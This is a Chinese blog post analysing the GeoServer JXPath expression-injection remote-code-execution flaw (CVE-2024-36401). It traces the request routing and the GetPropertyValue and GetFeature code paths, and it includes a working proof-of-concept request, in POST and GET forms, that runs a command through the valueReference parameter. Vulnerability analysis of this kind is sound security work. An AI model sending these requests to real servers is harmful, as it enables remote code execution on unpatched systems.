
  <!DOCTYPE html>
  <html lang="zh-CN"  data-theme="dark" >
  <head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script src="https://www.googletagmanager.com/gtag/js?id=true"></script>
  <script data-pjax>
    window.dataLayer = window.dataLayer || [];

    function gtag() {
      dataLayer.push(arguments);
    }

    gtag('js', new Date());

    gtag('config', 'true');
  </script>
  <!-- End Google Analytics -->


  

  
  <script async src="https://hm.baidu.com/hm.js?true"></script>
  <script data-pjax>
    var _hmt = _hmt || [];
    _hmt.push(["_trackPageview", location.pathname]);
  </script>


  
  <script>window.icon_font = '4552607_tq6stt6tcg';window.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.outdate = {"enable":true,"daysAgo":180,"message":"本文最后更新于 {time}，请注意文中内容可能已经发生变化。"};</script>
  
  
  <title>
    GeoServer表达式注入代码执行漏洞 |
    
    yyjccc的博客
  </title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic%7CUbuntu%20Mono:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
  
    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_tq6stt6tcg.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  
    
<link rel="stylesheet" href="/css/loader.css">

  
  <meta name="description" content="GeoServer表达式注入代码执行漏洞概述信息参考：https:&#x2F;&#x2F;avd.aliyun.com&#x2F;detail?id&#x3D;AVD-2024-36401披露时间： 2024.7.2github源码：https:&#x2F;&#x2F;github.com&#x2F;geoserver&#x2F;geoserver分析版本：2.25.0漏洞版本：2.25.0 &lt;&#x3D; GeoServer &lt; 2.25.22.24.0 &lt;&#x3D; Ge">
<meta property="og:type" content="article">
<meta property="og:title" content="GeoServer表达式注入代码执行漏洞">
<meta property="og:url" content="https://yyjccc.github.io/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="yyjccc的博客">
<meta property="og:description" content="GeoServer表达式注入代码执行漏洞概述信息参考：https:&#x2F;&#x2F;avd.aliyun.com&#x2F;detail?id&#x3D;AVD-2024-36401披露时间： 2024.7.2github源码：https:&#x2F;&#x2F;github.com&#x2F;geoserver&#x2F;geoserver分析版本：2.25.0漏洞版本：2.25.0 &lt;&#x3D; GeoServer &lt; 2.25.22.24.0 &lt;&#x3D; Ge">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/8.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/9.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/10.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/11.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/12.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/13.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/14.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/15.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/16.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/17.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/18.png">
<meta property="og:image" content="https://yyjccc.github.io/img/24-7-8/19.png">
<meta property="article:published_time" content="2024-07-08T06:41:41.939Z">
<meta property="article:modified_time" content="2024-07-12T04:55:37.843Z">
<meta property="article:author" content="Yyjccc">
<meta property="article:tag" content="java安全">
<meta property="article:tag" content="表达式注入">
<meta property="article:tag" content="geoserver">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://yyjccc.github.io/img/24-7-8/8.png">
  
    <link rel="alternate" href="/atom.xml" title="yyjccc的博客" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
  
  
  
    
      
<link rel="stylesheet" href="https://npm.webcache.cn/gitalk/dist/gitalk.css">

    
  
  
<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"></script>

  
    
<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.0.1/dist/aos.css">

  
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

  <body>
    
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id='loader'>
    <div class="loading-left-bg loading-bg"></div>
    <div class="loading-right-bg loading-bg"></div>
    <div class="spinner-box">
      <div class="loading-taichi">
        <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
          <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff5252" />
          <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
         M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="#ff5252" />
        </svg>
      </div>
      <div class="loading-word">少女祈祷中...</div>
    </div>
  </div>
  </div>
  <script>
    var time = null;
    var startLoading = () => {
      time = Date.now();
      document.getElementById('loader').classList.remove("loading");
    }
    var endLoading = () => {
      if (!time) {
        document.body.style.overflow = 'auto';
        document.getElementById('loader').classList.add("loading");
      } else {
        if (Date.now() - time > 500) {
          time = null;
          document.body.style.overflow = 'auto';
          document.getElementById('loader').classList.add("loading");
        } else {
          setTimeout(endLoading, 500 - (Date.now() - time));
          time = null;
        }
      }
    }
    window.addEventListener('DOMContentLoaded', endLoading);
    document.getElementById('loader').addEventListener('click', endLoading);
  </script>

<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
</div>


    <div id="container">
      <div id="wrap">
        <div id="header-nav">
  <nav id="main-nav">
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/">首页</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/archives">归档</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/about">关于</a>
      </span>
    
      <span class="main-nav-link-wrap">
        <div class="main-nav-icon icon-taichi"></div>
        <a class="main-nav-link" href="/friend">友链</a>
      </span>
    
    <a id="main-nav-toggle" class="nav-icon"></a>
  </nav>
  <nav id="sub-nav">
    
      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
    
    
    
      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索"></a>
    
  </nav>
</div>
<header id="header">
  
    
      <img fetchpriority="high" src="/images/banner.webp" alt="GeoServer表达式注入代码执行漏洞">
    
  
  <div id="header-outer">
    <div id="header-title">
      
        
        
          <a href="/" id="logo">
            <h1 data-aos="slide-up">GeoServer表达式注入代码执行漏洞</h1>
          </a>
        
      
      
        
        <h2 id="subtitle-wrap" data-aos="slide-down">
          
        </h2>
      
    </div>
  </div>
</header>

        <div id="content">
          
          <section id="main"><article id="post-GeoServer表达式注入代码执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-inner" data-aos="fade-up">
    <div class="article-meta">
      <div class="article-date">
  <a href="/2024/07/08/GeoServer%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date-link" data-aos="zoom-in">
    <time datetime="2024-07-08T06:41:41.939Z" itemprop="datePublished">2024-07-08</time>
    <time style="display: none;" id="post-update-time">2024-07-12</time>
  </a>
</div>

      
  <div class="article-category">
    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">cve复现</a>
  </div>


    </div>
    <div class="hr-line"></div>
    

    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote id="outdate-blockquote" style="display: none;"><p></p></blockquote>
      
      
        <h1 id="GeoServer表达式注入代码执行漏洞"><a href="#GeoServer表达式注入代码执行漏洞" class="headerlink" title="GeoServer表达式注入代码执行漏洞"></a>GeoServer表达式注入代码执行漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><strong>信息参考</strong>：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2024-36401">https://avd.aliyun.com/detail?id=AVD-2024-36401</a><br><strong>披露时间</strong>： 2024.7.2<br><strong>github源码</strong>：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver">https://github.com/geoserver/geoserver</a><br><strong>分析版本</strong>：2.25.0<br><strong>漏洞版本</strong>：<br>2.25.0 &lt;= GeoServer &lt; 2.25.2<br>2.24.0 &lt;= GeoServer &lt; 2.24.4<br>GeoServer &lt; 2.23.6</p>
<p>阐述：GeoServer由于GeoTool组件使用了含有漏洞的commons-jxpath组件导致表达式注入漏洞<br>相关信息：<br>漏洞通告：<a target="_blank" rel="noopener" href="https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv">https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv</a><br>GeoTool组件通告：<a target="_blank" rel="noopener" href="https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w">https://github.com/geotools/geotools/security/advisories/GHSA-w3pj-wh35-fq8w</a><br>Jxpath漏洞利用：<a target="_blank" rel="noopener" href="https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852">https://github.com/Warxim/CVE-2022-41852?tab=readme-ov-file#workaround-for-cve-2022-41852</a></p>
<p>前置知识：<br>JXPath表达式注入<br>可参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7">https://www.yuque.com/yyjccc/pk74ko/zzgiottebwxay9e7</a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载war包：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/geoserver/files">https://sourceforge.net/projects/geoserver/files</a><br>手动部署到Tomcat中，然后开启tomcat远程调试</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">./catalina.bat jpda start</span><br></pre></td></tr></tbody></table></figure>
<p>下载源码开启远程调式</p>
<p>然后用poc跑一下，发现是用参数控制路由的，逆向看看:</p>
<p>geoserver虽然使用了spring，但还是在OWS模块定义了Dispatcher总的控制器<br><img src="/img/24-7-8/8.png"></p>
<p>因此控制的流程还得看这个类<br>以下载的war包为例子,web.xml</p>
<figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- spring dispatcher servlet, dispatches all incoming requests --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- single mapping to spring, this only works properly if the advanced dispatch filter is </span></span><br><span class="line"><span class="comment">active --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcher<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>在handleRequestInternal方法中可以看到是通过请求查找服务的<br><img src="/img/24-7-8/9.png"><br>sevice方法中，如果请求方法是post方法，就会解析请求体的xml数据，然后你拿到对应的服务<br>接着在handleRequestInternal方法中分发对应的方法,再进行调用<br><img src="/img/24-7-8/10.png"></p>
<img src="/img/24-7-8/11.png">
## 漏洞分析
根据漏洞公告：未提供公开 PoC，但已确认可通过 WFS GetFeature、WFS GetPropertyValue、WMS GetMap、WMS GetFeatureInfo、WMS GetLegendGraphic 和 WPS 执行请求利用此漏洞。

<p>由于GeoServer 调用的 GeoTools 库存在问题，GeoTools存在Jxpath漏洞的利用，然后Geoserver又能通过发送OGC请求去调用到存在漏洞的触发点</p>
<p>根据GeoTool的漏洞通告：<br>通过以下方法将 XPath 表达式传递到 commons-jxpath 库，该库可以执行任意代码，并且如果 XPath 表达式由用户输入提供，则会出现安全问题（geotool组件的问题）。</p>
<ul>
<li>org.geotools.appschema.util.XmlXpathUtilites.getXPathValues(NamespaceSupport, String, Document)</li>
<li>org.geotools.appschema.util.XmlXpathUtilites.countXPathNodes(NamespaceSupport, String, Document)</li>
<li>org.geotools.appschema.util.XmlXpathUtilites.getSingleXPathValue(NamespaceSupport, String, Document)</li>
<li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.get(Object, String, Class<t>)</t></li>
<li>org.geotools.data.complex.expression.FeaturePropertyAccessorFactory.FeaturePropertyAccessor.set(Object, String, Object, Class)</li>
<li>org.geotools.data.complex.expression.MapPropertyAccessorFactory.new PropertyAccessor() {…}.get(Object, String, Class<t>)</t></li>
<li>org.geotools.xsd.StreamingParser.StreamingParser(Configuration, InputStream, String)</li>
</ul>
<p>Geoserver的漏洞通告中直接给出了可能存在的漏洞请求，以及请求方法如下</p>
<ul>
<li>WFS GetFeature</li>
<li>WFS GetPropertyValue</li>
<li>WMS GetMap</li>
<li>WMS GetFeatureInfo</li>
<li>WMS GetLegendGraphic</li>
<li>WPS Execute</li>
</ul>
<p>Web Feature Service （WFS）是开放地理空间联盟（OGC）创建的一个标准，用于在互联网上使用HTTP创建、修改和交换矢量格式的地理信息。WFS以地理标记语言（GML）编码和传输信息，GML是XML的一个子集。<br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br>以上是Geoserver对于wfs的介绍，其实就可以理解为一个协议，能够访问通过http访问地理信息的协议，然后该协议在不同版本有许多操作</p>
<h3 id="GetPropertyValue"><a href="#GetPropertyValue" class="headerlink" title="GetPropertyValue"></a>GetPropertyValue</h3><p>我们需要利用的就是存在于2.0.0版本的GetPropertyValue操作<br>从数据存储中为使用查询表达式标识的一组功能检索功能属性的值或复杂功能属性的部分值<br>从描述就可以发现他是通过表达式语言查询对应的Property属性，这里具体指的就是特定地理特征类型（如地图中的河流、建筑物等）的描述信息，包括其属性和其他特性的定义。</p>
<p>接着直接就在官网的文档找到了WFS GetPropertyValue的样例<br><a target="_blank" rel="noopener" href="https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html">https://www.osgeo.cn/geoserver-user-manual/services/wfs/reference.html</a><br><img src="/img/24-7-8/12.png"><br>然后构造请求修改一下valueReference参数的值就能成功RCE<br>实际情况命名空间需要自己获取<br>获取api:直接访问：/geoserver/web/wicket/bookmarkable/org.geoserver.web.demo.MapPreviewPage<br>即可<br><img src="/img/24-7-8/13.png"><br>可能有些需要认证，哪个能用用哪个<br>下面是几个默认的（实际中不一定有）：</p>
<ul>
<li>sf:archsites</li>
</ul>
<p>示例poc:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">POST /geoserver/wfs HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:7878</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 356</span><br><span class="line"></span><br><span class="line">&lt;wfs:GetPropertyValue service='WFS' version='2.0.0'</span><br><span class="line"> xmlns:topp='http://www.openplans.org/topp'</span><br><span class="line"> xmlns:fes='http://www.opengis.net/fes/2.0'</span><br><span class="line"> xmlns:wfs='http://www.opengis.net/wfs/2.0'&gt;</span><br><span class="line">  &lt;wfs:Query typeNames='sf:archsites'/&gt;</span><br><span class="line">  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),'calc')&lt;/wfs:valueReference&gt;</span><br><span class="line">&lt;/wfs:GetPropertyValue&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>等价的get请求</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">/geoserver/wfs?service=WFS&amp;version=<span class="number">2.0</span><span class="number">.0</span>&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),<span class="string">'calc'</span>)</span><br></pre></td></tr></tbody></table></figure>

<p>然后定位到GetPropertyValue#run方法<br><img src="/img/24-7-8/14.png"><br>跟进property方法<br><img src="/img/24-7-8/15.png"><br>返回的是AttributeExpressionImpl对象<br><img src="/img/24-7-8/16.png"><br>这里可以看到，传入的name，赋值给attpath属性,可知request.getValueReference(),即ValueReference标签对应着xpath表达式<br>那么，就是这样控制xpath表达式的，接着看怎么执行的<br>跟进AttributeExpressionImpl#evaluate方法<br>也是将上面赋值的attPath传入了<br><img src="/img/24-7-8/17.png"></p>
<p>也是来到了漏洞api ：FeaturePropertyAccessorFactory#get<br><img src="/img/24-7-8/18.png"><br>这里iteratePointers方法就能触发了漏洞了，可以参考之前的文章</p>
<h3 id="GetFeature"><a href="#GetFeature" class="headerlink" title="GetFeature"></a>GetFeature</h3><p>这个请求是用于从服务器检索地理空间要素的全部或部分属性及几何信息，而通过前面的漏洞的分析我们很容易知道漏洞触发点是在属性名查询这里，所以这里的GetFeature请求我们重点关注一下filter过滤逻辑部分，对于属性名的处理</p>
<figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个名为validateFilter的方法，该方法接收四个参数：一个Filter对象，一个Query对象，一个FeatureTypeInfo对象和一个GetFeatureRequest对象。</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">validateFilter</span><span class="params">(</span></span><br><span class="line"><span class="params">        Filter filter, Query query, <span class="keyword">final</span> FeatureTypeInfo meta, <span class="keyword">final</span> GetFeatureRequest request)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 确保任何属性名都指向一个实际存在的属性</span></span><br><span class="line">    <span class="comment">// 获取特征类型</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">FeatureType</span> <span class="variable">featureType</span> <span class="operator">=</span> meta.getFeatureType();</span><br><span class="line">    <span class="comment">// 创建一个表达式访问器</span></span><br><span class="line">    <span class="type">ExpressionVisitor</span> <span class="variable">visitor</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AbstractExpressionVisitor</span>() {</span><br><span class="line">                <span class="comment">// 重写visit方法</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">visit</span><span class="params">(PropertyName name, Object data)</span> {</span><br><span class="line">                    <span class="comment">// 如果属性名在特征类型中找不到，并且属性名不是GmlBoundedBy</span></span><br><span class="line">                    <span class="keyword">if</span> (name.evaluate(featureType) == <span class="literal">null</span> &amp;&amp; !isGmlBoundedBy(name)) {</span><br><span class="line">                        <span class="comment">// 抛出一个WFSException异常，异常信息为"非法的属性名"</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WFSException</span>(</span><br><span class="line">                                request,</span><br><span class="line">                                <span class="string">"Illegal property name: "</span></span><br><span class="line">                                        + name.getPropertyName()</span><br><span class="line">                                        + <span class="string">" for feature type "</span></span><br><span class="line">                                        + meta.prefixedName(),</span><br><span class="line">                                <span class="string">"InvalidParameterValue"</span>);</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> name;</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">    <span class="comment">// 使用访问器访问过滤器</span></span><br><span class="line">    filter.accept(<span class="keyword">new</span> <span class="title class_">AbstractFilterVisitor</span>(visitor), <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 确保任何空间谓词都是针对实际的空间属性</span></span><br><span class="line">    <span class="comment">// 创建一个过滤器访问器</span></span><br><span class="line">    <span class="type">AbstractFilterVisitor</span> <span class="variable">fvisitor</span> <span class="operator">=</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AbstractFilterVisitor</span>() {</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 重写visit方法</span></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> Object <span class="title function_">visit</span><span class="params">(BinarySpatialOperator filter, Object data)</span> {</span><br><span class="line">                    <span class="type">PropertyName</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                    <span class="comment">// 如果过滤器的第一个表达式是属性名</span></span><br><span class="line">                    <span class="keyword">if</span> (filter.getExpression1() <span class="keyword">instanceof</span> PropertyName) {</span><br><span class="line">                        name = (PropertyName) filter.getExpression1();</span><br><span class="line">                    } <span class="keyword">else</span> <span class="keyword">if</span> (filter.getExpression2() <span class="keyword">instanceof</span> PropertyName) {</span><br><span class="line">                        <span class="comment">// 如果过滤器的第二个表达式是属性名</span></span><br><span class="line">                        name = (PropertyName) filter.getExpression2();</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (name != <span class="literal">null</span>) {</span><br><span class="line">                        <span class="comment">// 检查特征类型以确保其是一个几何类型</span></span><br><span class="line">                        <span class="type">AttributeDescriptor</span> <span class="variable">att</span> <span class="operator">=</span></span><br><span class="line">                                (AttributeDescriptor) name.evaluate(featureType);</span><br><span class="line">                        <span class="keyword">if</span> (!(att <span class="keyword">instanceof</span> GeometryDescriptor) &amp;&amp; !isGmlBoundedBy(name)) {</span><br><span class="line">                            <span class="comment">// 如果不是，抛出一个WFSException异常，异常信息为"属性不是特征类型的几何属性"</span></span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WFSException</span>(</span><br><span class="line">                                    request,</span><br><span class="line">                                    <span class="string">"Property "</span></span><br><span class="line">                                            + name</span><br><span class="line">                                            + <span class="string">" is not geometric in feature type "</span></span><br><span class="line">                                            + meta.prefixedName(),</span><br><span class="line">                                    <span class="string">"InvalidParameterValue"</span>);</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> filter;</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">    <span class="comment">// 使用访问器访问过滤器</span></span><br><span class="line">    filter.accept(fvisitor, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 确保查询中指定的任何边界都相对于查询上定义的srs是有效的</span></span><br><span class="line">    <span class="comment">// 如果wfs是CiteCompliant</span></span><br><span class="line">    <span class="keyword">if</span> (wfs.isCiteCompliant()) {</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果查询的srsName不为空</span></span><br><span class="line">        <span class="keyword">if</span> (query.getSrsName() != <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Query</span> <span class="variable">fquery</span> <span class="operator">=</span> query;</span><br><span class="line">            <span class="comment">// 创建一个CiteBBOXValidator对象</span></span><br><span class="line">            fvisitor = <span class="keyword">new</span> <span class="title class_">CiteBBOXValidator</span>(fquery, request);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 使用访问器访问过滤器</span></span><br><span class="line">            filter.accept(fvisitor, <span class="literal">null</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 确保在非空间比较中不使用空间属性 (CITE WFS 2.0)</span></span><br><span class="line">    <span class="comment">// 如果wfs是CiteCompliant</span></span><br><span class="line">    <span class="keyword">if</span> (wfs.isCiteCompliant()) {</span><br><span class="line">        <span class="comment">// 创建一个过滤器访问器</span></span><br><span class="line">        fvisitor =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">AbstractFilterVisitor</span>() {</span><br><span class="line">                    <span class="comment">// 重写visit方法</span></span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">protected</span> Object <span class="title function_">visit</span><span class="params">(BinaryComparisonOperator filter, Object data)</span> {</span><br><span class="line">                        <span class="type">Expression</span> <span class="variable">ex1</span> <span class="operator">=</span> filter.getExpression1();</span><br><span class="line">                        <span class="type">Expression</span> <span class="variable">ex2</span> <span class="operator">=</span> filter.getExpression2();</span><br><span class="line">                        <span class="comment">// 如果第一个表达式是属性名</span></span><br><span class="line">                        <span class="keyword">if</span> (ex1 <span class="keyword">instanceof</span> PropertyName) {</span><br><span class="line">                            checkNonSpatial((PropertyName) ex1);</span><br><span class="line">                        }</span><br><span class="line">                        <span class="comment">// 如果第二个表达式是属性名</span></span><br><span class="line">                        <span class="keyword">if</span> (ex2 <span class="keyword">instanceof</span> PropertyName) {</span><br><span class="line">                            checkNonSpatial((PropertyName) ex2);</span><br><span class="line">                        }</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">return</span> <span class="built_in">super</span>.visit(filter, data);</span><br><span class="line">                    }</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 定义一个检查非空间的方法</span></span><br><span class="line">                    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">checkNonSpatial</span><span class="params">(PropertyName pn)</span> {</span><br><span class="line">                        <span class="type">AttributeDescriptor</span> <span class="variable">ad</span> <span class="operator">=</span> (AttributeDescriptor) pn.evaluate(featureType);</span><br><span class="line">                        <span class="comment">// 如果属性描述符是一个几何描述符或者是GmlBoundedBy</span></span><br><span class="line">                        <span class="keyword">if</span> (ad <span class="keyword">instanceof</span> GeometryDescriptor || isGmlBoundedBy(pn)) {</span><br><span class="line">                            <span class="comment">// 抛出一个WFSException异常，异常信息为"不能在字母数字二进制比较中使用空间属性"</span></span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WFSException</span>(</span><br><span class="line">                                    request,</span><br><span class="line">                                    <span class="string">"Cannot use a spatial property in a alphanumeric binary "</span></span><br><span class="line">                                            + <span class="string">"comparison"</span>);</span><br><span class="line">                        }</span><br><span class="line">                    }</span><br><span class="line">                };</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用访问器访问过滤器</span></span><br><span class="line">        filter.accept(fvisitor, <span class="literal">null</span>);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
